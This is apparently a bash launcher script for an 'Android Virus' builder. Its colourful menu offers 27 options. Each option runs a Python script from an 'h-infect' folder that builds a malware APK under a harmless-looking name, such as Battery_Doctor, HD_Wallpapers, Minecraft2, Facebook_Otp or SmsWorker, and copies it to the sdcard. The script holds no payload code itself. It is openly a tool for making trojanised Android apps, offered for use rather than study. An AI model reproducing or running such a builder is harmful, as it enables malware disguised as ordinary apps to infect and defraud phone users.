red='\033[1;31m'
rset='\033[0m'      
grn='\033[1;32m'
ylo='\033[1;33m'
blue='\033[1;34m'
cyan='\033[1;36m'
pink='\033[1;35m'
center() {
  termwidth=$(stty size | cut -d" " -f2)
  padding="$(printf '%0.1s' ={1..500})"
  printf '%*.*s %s %*.*s\n' 0 "$(((termwidth-2-${#1})/2))" "$padding" "$1" 0 "$(((termwidth-1-${#1})/2))" "$padding"
}
#coding section starts :)
lagi=01
while [ $lagi -lt 6 ];
do
clear 
echo -e "$pink

           ╔═╗╔╗╔╔╦╗╦═╗╔═╗╦╔╦╗  ╦  ╦╦╦═╗╦ ╦╔═╗
           ╠═╣║║║ ║║╠╦╝║ ║║ ║║  ╚╗╔╝║╠╦╝║ ║╚═╗
           ╩ ╩╝╚╝═╩╝╩╚═╚═╝╩═╩╝   ╚╝ ╩╩╚═╚═╝╚═╝"
echo ""
echo -e "$grn     ::::::::::::::::::$ylo [ TYPE ]$grn ::::::::::::::::::::$rset"
echo ""
echo -e "$red       ➡ [01]$blue Agent$red             ➡ [15]$blue Kitchenn";
echo -e "$red       ➡ [02]$blue Android_Updater$red   ➡ [16]$blue Label_Reader";
echo -e "$red       ➡ [03]$blue Artstation$red        ➡ [17]$blue laughtter ";
echo -e "$red       ➡ [04]$blue Battery_Doctor$red    ➡ [18]$blue masnu";
echo -e "$red       ➡ [05]$blue Brain_Test$red        ➡ [19]$blue minecraft2";
echo -e "$red       ➡ [06]$blue Cool_Lancher$red      ➡ [20]$blue musicplayer";
echo -e "$red       ➡ [07]$blue Dendroid$red          ➡ [21]$blue omigo";
echo -e "$red       ➡ [08]$blue Downloader$red        ➡ [22]$blue prasesfee";
echo -e "$red       ➡ [09]$blue Facebook_Otp$red      ➡ [23]$blue romanticpos";
echo -e "$red       ➡ [10]$blue Gapp_Store$red        ➡ [24]$blue settings";
echo -e "$red       ➡ [11]$blue Gatitos$red           ➡ [25]$blue smsworker";
echo -e "$red       ➡ [12]$blue Hd_Wallpapers$red     ➡ [26]$blue statess";
echo -e "$red       ➡ [13]$blue ImagePets$red         ➡ [27]$blue thinkking";
echo -e "$red       ➡ [14]$blue IWinOnline$red        ➡ [00]$blue exit";
echo ""
echo -e "$grn     :::::::::::::::::$ylo [ SELECT ]$grn :::::::::::::::::::$rset"
echo " "
echo -e "$cyan	      ╭─$pink[[[$red Select any option$pink ]]]$cyan"
read -p "              ╰──────────➤ "  n;
case "$n" in
01) clear
#Agent
cd
cd h-infect
cd core
cd hpv
cd han
clear
echo ""
echo -e "$grn"
center "Creating The Virus"
sleep 5.0
echo -e "$blue Malware Build[\e[92m✓\e[34m]$grn"
sleep 2.0
python agent.py
cd Android
mv Agent.apk /sdcard/TECHABITS
center "Agent Virus Successfull Created"
sleep 3.0
;;
02) clear
#Android_Updater
cd
cd h-infect
cd core
cd hpv
cd han
clear
echo ""
echo -e "$grn"
center "Creating The Virus"
sleep 5.0
echo -e "$blue Malware Build[\e[92m✓\e[34m]$grn"
sleep 2.0
python android_updater.py
cd Android
mv Android_Updater.apk /sdcard/TECHABITS
center "Android_Updater Virus Successfull Created"
sleep 3.0
;;
03) clear
#Artstation
cd
cd h-infect
cd core
cd hpv
cd han
clear
echo ""
echo -e "$grn"
center "Creating The Virus"
sleep 5.0
echo -e "$blue Malware Build[\e[92m✓\e[34m]$grn"
sleep 2.0
python artstation.py
cd Android
mv ArtStation.apk /sdcard/TECHABITS
center "ArtStation Virus Successfull Created"
sleep 3.0
;;
04) clear
#Battery_Doctor
cd
cd h-infect
cd core
cd hpv
cd han
clear
echo ""
echo -e "$grn"
center "Creating The Virus"
sleep 5.0
echo -e "$blue Malware Build[\e[92m✓\e[34m]$grn"
sleep 2.0
python battery_doctor.py
cd Android
mv Battery_Doctor.apk /sdcard/TECHABITS
center "Battery_Doctor Virus Successfull Created"
sleep 3.0
;;
05) clear
#BrainTest
cd
cd h-infect
cd core
cd hpv
cd han
clear
echo ""
echo -e "$grn"
center "Creating The Virus"
sleep 5.0
echo -e "$blue Malware Build[\e[92m✓\e[34m]$grn"
sleep 2.0
python braintest.py
cd Android
mv BrainTest.apk /sdcard/TECHABITS
center "BrainTest Virus Successfull Created"
sleep 3.0
;;
06) clear
#Cool_Lancher
cd
cd h-infect
cd core
cd hpv
cd han
clear
echo ""
echo -e "$grn"
center "Creating The Virus"
sleep 5.0
echo -e "$blue Malware Build[\e[92m✓\e[34m]$grn"
sleep 2.0
python cool_lancher.py
cd Android
mv Cool_Lancher.apk /sdcard/TECHABITS
center "Cool_Lancher  Virus Successfull Created"
sleep 3.0
;;
07) clear
#Dendroid
cd
cd h-infect
cd core
cd hpv
cd han
clear
echo ""
echo -e "$grn"
center "Creating The Virus"
sleep 5.0
echo -e "$blue Malware Build[\e[92m✓\e[34m]$grn"
sleep 2.0
python dendroid.py
cd Android
mv Dendroid.apk /sdcard/TECHABITS
center "Dendroid Virus Successfull Created"
sleep 3.0
;;
08) clear
#Downloader
cd
cd h-infect
cd core
cd hpv
cd han
clear
echo ""
echo -e "$grn"
center "Creating The Virus"
sleep 5.0
echo -e "$blue Malware Build[\e[92m✓\e[34m]$grn"
sleep 2.0
python downloader.py
cd Android
mv Downloader.apk /sdcard/TECHABITS
center "Downloader Virus Successfull Created"
sleep 3.0
;;
09) clear
#Facebook_Otp
cd
cd h-infect
cd core
cd hpv
cd han
clear
echo ""
echo -e "$grn"
center "Creating The Virus"
sleep 5.0
echo -e "$blue Malware Build[\e[92m✓\e[34m]$grn"
sleep 2.0
python facebook_otp.py
cd Android
mv Facebook_OTP.apk /sdcard/TECHABITS
center "Facebook_OTP Virus Successfull Created"
sleep 3.0
;;
10) clear
#Gapp_Store
cd
cd h-infect
cd core
cd hpv
cd han
clear
echo ""
echo -e "$grn"
center "Creating The Virus"
sleep 5.0
echo -e "$blue Malware Build[\e[92m✓\e[34m]$grn"
sleep 2.0
python gapp_store.py
cd Android
mv GApp_Store.apk /sdcard/TECHABITS
center "GApp_Store Virus Successfull Created"
sleep 3.0
;;
11) clear
#Gatitos
cd
cd h-infect
cd core
cd hpv
cd han
clear
echo ""
echo -e "$grn"
center "Creating The Virus"
sleep 5.0
echo -e "$blue Malware Build[\e[92m✓\e[34m]$grn"
sleep 2.0
python gatitos.py
cd Android
mv Gatitos.apk /sdcard/TECHABITS
center "Gatitos Virus Successfull Created"
sleep 3.0
;;
12) clear
#Hd_Wallpapers
cd
cd h-infect
cd core
cd hpv
cd han
clear
echo ""
echo -e "$grn"
center "Creating The Virus"
sleep 5.0
echo -e "$blue Malware Build[\e[92m✓\e[34m]$grn"
sleep 2.0
python hd_wallpaper.py
cd Android
mv HD_Wallpaper.apk /sdcard/TECHABITS
center "HD_Wallpaper Virus Successfull Created"
sleep 3.0
;;
13) clear
#ImagePets
cd
cd h-infect
cd core
cd hpv
cd han
clear
echo ""
echo -e "$grn"
center "Creating The Virus"
sleep 5.0
echo -e "$blue Malware Build[\e[92m✓\e[34m]$grn"
sleep 2.0
python imagepets.py
cd Android
mv Imagepets.apk /sdcard/TECHABITS
center "ImagePets Virus Successfull Created"
sleep 3.0
;;
14) clear
#IWinOnline
cd
cd h-infect
cd core
cd hpv
cd han
clear
echo ""
echo -e "$grn"
center "Creating The Virus"
sleep 5.0
echo -e "$blue Malware Build[\e[92m✓\e[34m]$grn"
sleep 2.0
python iwinonline.py
cd Android
mv IwinOnline.apk /sdcard/TECHABITS
center "IWinOnline Virus Successfull Created"
sleep 3.0
;;
15) clear
#Kitchenn
cd
cd h-infect
cd core
cd hpv
cd han
clear
echo ""
echo -e "$grn"
center "Creating The Virus"
sleep 5.0
echo -e "$blue Malware Build[\e[92m✓\e[34m]$grn"
sleep 2.0
python kitchenn.py
cd Android
mv Kitchenn.apk /sdcard/TECHABITS
center "Kitchenn Virus Successfull Created"
sleep 3.0
;;
16) clear
#Label_Reader
cd
cd h-infect
cd core
cd hpv
cd han
clear
echo ""
echo -e "$grn"
center "Creating The Virus"
sleep 5.0
echo -e "$blue Malware Build[\e[92m✓\e[34m]$grn"
sleep 2.0
python label_reader.py
cd Android
mv Label_Reader.apk /sdcard/TECHABITS
center "Label_Reader Virus Successfull Created"
sleep 3.0
;;
17) clear
#Laughtter
cd
cd h-infect
cd core
cd hpv
cd han
clear
echo ""
echo -e "$grn"
center "Creating The Virus"
sleep 5.0
echo -e "$blue Malware Build[\e[92m✓\e[34m]$grn"
sleep 2.0
python laughtter.py
cd Android
mv Laughtter.apk /sdcard/TECHABITS
center "Laughtter Virus Successfull Created"
sleep 3.0
;;
18) clear
#Masnu
cd
cd h-infect
cd core
cd hpv
cd han
clear
echo ""
echo -e "$grn"
center "Creating The Virus"
sleep 5.0
echo -e "$blue Malware Build[\e[92m✓\e[34m]$grn"
sleep 2.0
python masnu.py
cd Android
mv Masnu.apk /sdcard/TECHABITS
center "Masnu Virus Successfull Created"
sleep 3.0
;;
19) clear
#Minecraft
cd
cd h-infect
cd core
cd hpv
cd han
clear
echo ""
echo -e "$grn"
center "Creating The Virus"
sleep 5.0
echo -e "$blue Malware Build[\e[92m✓\e[34m]$grn"
sleep 2.0
python minecraft2.py
cd Android
mv Minecraft2.apk /sdcard/TECHABITS
center "Minecraft2 Virus Successfull Created"
sleep 3.0
;;
20) clear
#Musicplayer
cd
cd h-infect
cd core
cd hpv
cd han
clear
echo ""
echo -e "$grn"
center "Creating The Virus"
sleep 5.0
echo -e "$blue Malware Build[\e[92m✓\e[34m]$grn"
sleep 2.0
python musicplayeradware.py
cd Android
mv MusicPlayerAdWare.apk /sdcard/TECHABITS
center "Musicplayer Virus Successfull Created"
sleep 3.0
;;
21) clear
#Omigo
cd
cd h-infect
cd core
cd hpv
cd han
clear
echo ""
echo -e "$grn"
center "Creating The Virus"
sleep 5.0
echo -e "$blue Malware Build[\e[92m✓\e[34m]$grn"
sleep 2.0
python omigo.py
cd Android
mv Omigo.apk /sdcard/TECHABITS
center "Omigo Virus Successfull Created"
sleep 3.0
;;
22) clear
#Prasesfee
cd
cd h-infect
cd core
cd hpv
cd han
clear
echo ""
echo -e "$grn"
center "Creating The Virus"
sleep 5.0
echo -e "$blue Malware Build[\e[92m✓\e[34m]$grn"
sleep 2.0
python prasesfee.py
cd Android
mv Prasesfee.apk /sdcard/TECHABITS
center "Prasesfee Virus Successfull Created"
sleep 3.0
;;
23) clear
#Romanticpos
cd
cd h-infect
cd core
cd hpv
cd han
clear
echo ""
echo -e "$grn"
center "Creating The Virus"
sleep 5.0
echo -e "$blue Malware Build[\e[92m✓\e[34m]$grn"
sleep 2.0
python romaticpos.py
cd Android
mv Romaticpos.apk /sdcard/TECHABITS
center "Romaticpos Virus Successfull Created"
sleep 3.0
;;
24) clear
#Settings
cd
cd h-infect
cd core
cd hpv
cd han
clear
echo ""
echo -e "$grn"
center "Creating The Virus"
sleep 5.0
echo -e "$blue Malware Build[\e[92m✓\e[34m]$grn"
sleep 2.0
python settings.py
cd Android
mv Settings.apk /sdcard/TECHABITS
center "Settings Virus Successfull Created"
sleep 3.0
;;
25) clear
#SmsWorker
cd
cd h-infect
cd core
cd hpv
cd han
clear
echo ""
echo -e "$grn"
center "Creating The Virus"
sleep 5.0
echo -e "$blue Malware Build[\e[92m✓\e[34m]$grn"
sleep 2.0
python smsworker.py
cd Android
mv SmsWorker.apk /sdcard/TECHABITS
center "SmsWorker Virus Successfull Created"
sleep 3.0
;;
26) clear
#Statetss
cd
cd h-infect
cd core
cd hpv
cd han
clear
echo ""
echo -e "$grn"
center "Creating The Virus"
sleep 5.0
echo -e "$blue Malware Build[\e[92m✓\e[34m]$grn"
sleep 2.0
python statetss.py
cd Android
mv Statetss.apk /sdcard/TECHABITS
center "Statetss Virus Successfull Created"
sleep 3.0
;;
27) clear
#Thinkking
cd
cd h-infect
cd core
cd hpv
cd han
clear
echo ""
echo -e "$grn"
center "Creating The Virus"
sleep 5.0
echo -e "$blue Malware Build[\e[92m✓\e[34m]$grn"
sleep 2.0
python thinkking.py
cd Android
mv Thinkking.apk /sdcard/TECHABITS
center "Thinkking Virus Successfull Created"
sleep 3.0
;;
00) clear
exit
;;
*) clear
echo ""
echo -e "$grn sorry, the  option you looking is not found"
sleep 2.0
clear
esac
done
done

=================="